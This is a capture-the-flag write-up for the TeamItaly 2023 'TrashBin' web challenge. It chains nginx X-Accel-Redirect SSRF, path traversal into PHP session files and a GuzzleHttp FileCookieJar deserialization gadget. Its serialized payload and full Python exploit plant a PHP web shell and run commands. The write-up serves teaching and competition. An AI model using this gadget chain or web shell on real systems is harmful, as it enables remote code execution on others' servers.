# TeamItaly CTF 2023

## [web] TrashBin (0 solves)
Tired of having external dependencies for my VAPTs, I decided to create my own service! It's still a work in progress, but I think I'm ready to release the public demo.

Author: Lorenzo Leonardini <@pianka>

## Overview

TrashBin is a request bin ~~clone~~ alternative, useful to log HTTP requests and respond with custom data.

As it's made quite obvious by the `/readflag` binary, our final goal is to reach RCE. Achieving that is not super straight-forward. TL;DR: SSRF + path traversal + object deserialization.

### `X-Accel-Redirect`

The first step we need is getting SSRF in order to make arbitrary requests to the `/internal/` endpoints blocked by the nginx configuration. Why we need SSRF will become clearer later.

SSRF can be done by exploiting some less-known nginx featured, called `X-Accel`.
TL;DR, from the docs: "[X-accel allows for internal redirection to a location determined by a header returned from a backend](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)". Basically it's a feature that can be used for authentication, but what we are interested in is that it can be used to do SSRF and access endpoints defined as `internal`.

Since TrashBin allows us to respond with custom headers to each request, we can define a `X-Accel-Redirect` header that points to the PHP files inside the `/internal/` directory.

Now what?

### Corrupting the session

PHP sessions are stored in temp files as serialized PHP objects. The `rotate_logs.php` file reads and writes log files, but doesn't really validate their content. We can exploit the not-so-precise regex used to extract `$__BIN_ID` to achieve path traversal. For example, we can make a request to `/internal/rotate_logs.php?id=/b/../../../../../tmp/sess_PHPSESSID` to start fiddling around with session files.

We can create an account with a username using the following format:

```
****PAYLOAD****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a
```

This will be saved in the session file as something like this:

```
id|s:36:"c6c6742d-3616-4bd1-9340-44eae65eb08b";username|s:106:"****PAYLOAD****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a"
```

When `rotate_logs.php` is executed on this file, it will identify 21 log entries and remove the first one, leaving us with something like

```
PAYLOAD****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a"
```

If we carefully craft our username, we can exploit the deserialization gadget offered by the `GuzzleHttp` library[^1] in order to get arbitrary file write and install a PHP backdoor on the server:

```python
requests.post(f'{URL}', data={
   'username': b'****id|s:36:"c6c6742d-3616-4bd1-9340-44eae65eb08b";pwn|O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:36:"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies";a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{s:33:"\x00GuzzleHttp\\Cookie\\SetCookie\x00data";a:10:{s:4:"Name";s:6:"custom";s:5:"Value";s:3:"asd";s:6:"Domain";s:11:"example.com";s:4:"Path";s:1:"/";s:7:"Max-Age";N;s:7:"Expires";N;s:6:"Secure";b:0;s:7:"Discard";b:0;s:8:"HttpOnly";b:0;s:6:"custom";s:34:"<?php system($_GET[\'command\']); ?>";}}}s:39:"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode";b:0;s:41:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename";s:35:"/app/trashbin/src/data/backdoor.php";s:52:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies";b:1;};username|s:95:"****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a'
})
```

At this point we only need to use the SSRF vulnerability and chain everything together.

[^1]: GuzzleHttp defines a class called `FileCookieJar` that, on destruction, saves all the cookies in the jar in a file on disk. You can define the file location as well as the cookies, so you can inject PHP code anywhere you want. Understanding how to generate the payload is left as an exercise to the reader :)

### Full exploit

Here is the full automated python exploit:

```python
session1 = requests.Session()
session2 = requests.Session()

backdoor_name = ''.join(random.choices(string.ascii_letters, k=32)) + '.php'

# Register attack user
session1.post(f'{URL}', data={
   'username': b'****id|s:36:"c6c6742d-3616-4bd1-9340-44eae65eb08b";pwn|O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:36:"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies";a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{s:33:"\x00GuzzleHttp\\Cookie\\SetCookie\x00data";a:10:{s:4:"Name";s:6:"custom";s:5:"Value";s:3:"asd";s:6:"Domain";s:11:"example.com";s:4:"Path";s:1:"/";s:7:"Max-Age";N;s:7:"Expires";N;s:6:"Secure";b:0;s:7:"Discard";b:0;s:8:"HttpOnly";b:0;s:6:"custom";s:34:"<?php system($_GET[\'command\']); ?>";}}}s:39:"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode";b:0;s:41:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename";s:' + str(23 + len(backdoor_name)).encode() + b':"/app/trashbin/src/data/' + backdoor_name.encode() + b'";s:52:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies";b:1;};username|s:95:"****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a'
})

# Register helper user
res = session2.post(f'{URL}', data={
   'username': 'pianka'
})

# Set response headers
session2.post(res.url, data={
   'response': 'Thank you for your trash!',
   'headers': json.dumps({
      'X-Accel-Redirect': f'/internal/rotate_logs.php?id=/b/../../../../../tmp/sess_{session1.cookies["PHPSESSID"]}'
   })
})

# SSRF
session2.get(res.url.replace('/m/', '/b/'))

# Install backdoor
session1.get(URL)

# RCE
res = session1.get(f'{URL}/data/{backdoor_name}?command=/readflag')
print(res.text)
```
